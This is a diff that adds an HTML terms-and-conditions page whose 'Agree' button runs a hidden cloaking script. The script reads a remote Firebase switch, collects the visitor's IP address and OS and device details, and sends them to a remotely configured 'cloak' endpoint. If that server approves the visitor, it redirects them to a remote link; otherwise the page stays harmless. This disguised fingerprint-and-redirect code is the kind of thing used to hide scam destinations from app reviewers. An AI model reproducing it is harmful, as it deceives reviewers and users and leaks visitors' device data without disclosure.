@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Terms and Conditions</title>
+    <style>
+      body, html{
+        height: 100%;
+        font-size: 1.1rem;
+      }
+      body{
+        font-family: Arial, Helvetica, sans-serif;
+      }
+      
+      .container{
+        max-width: 1200px;
+        margin: 0 auto;
+      }
+      button{
+        width: 100%;
+        background: black;
+        color: white;
+        padding: 8px;
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 1em;
+        border: 0;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div>
+        <h1 style="text-align: center;">Terms and Conditions</h1>
+        <p>
+          Please read these terms and conditions carefully before using Our Service.
+        </p>
+        <p>
+          These are the Terms and Conditions governing the use of this Service and the agreement that operates between You and the Company. 
+          These Terms and Conditions set out the rights and obligations of all users regarding the use of the Service.
+        </p>
+        <p>
+          Your access to and use of the Service is conditioned on Your acceptance of and compliance with these Terms and Conditions. 
+          These Terms and Conditions apply to all visitors, users and others who access or use the Service.
+        </p>
+        <p>
+          By accessing or using the Service You agree to be bound by these Terms and Conditions. 
+          If You disagree with any part of these Terms and Conditions then You may not access the Service.
+          You represent that you are over the age of 18. The Company does not permit those under 18 to use the Service.
+        </p>
+        <p>
+          Your access to and use of the Service is also conditioned on Your acceptance of and compliance with the Privacy Policy of the Company. 
+          Our Privacy Policy describes Our policies and procedures on the collection, use and disclosure of Your personal information when You use the 
+          Application or the Website and tells You about Your privacy rights and how the law protects You. 
+          Please read Our Privacy Policy carefully before using Our Service.
+        </p>
+        <p>
+          By clicking the "Agree" button, you agree to the terms and conditions of our application.
+        </p>
+      </div>
+      <div>
+        <button onclick="onAgreeClick()">
+          Agree
+        </button>
+      </div>
+    </div>
+  </body>
+  <script src="https://www.gstatic.com/firebasejs/8.1.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.1.1/firebase-database.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.2/src/ua-parser.min.js"></script>
+  <script>
+    const firebaseConfig = {
+      databaseURL: "https://quotex-d1649-default-rtdb.europe-west1.firebasedatabase.app",
+    };
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+    function onAgreeClick(){
+      var starCountRef = firebase.database().ref('schema');
+      starCountRef.on('value', (snapshot) => {
+        const data = snapshot.val();
+        if(data?.enabled === 1){
+          fetch('https://api.ipify.org/?format=json').then(response => response.json()).then(res => {
+            const ua = new UAParser().getResult();
+            fetch(`
+              ${data?.cloak}?
+              ip=${res?.ip}&
+              systemName=${ua?.os.name}&
+              systemVersion=${ua?.os.version}&
+              model=${ua?.device.model}`
+            ).then(response => response.text()).then(res => {
+              if(+res === 1){
+                window.location.href = data?.link
+              }else{
+                window.location.hash = 'agreeButton'
+              }
+            })
+          })
+        }else{
+          window.location.hash = 'agreeButton'
+        }
+      });
+    }
+    
+    
+  </script>
+</html>
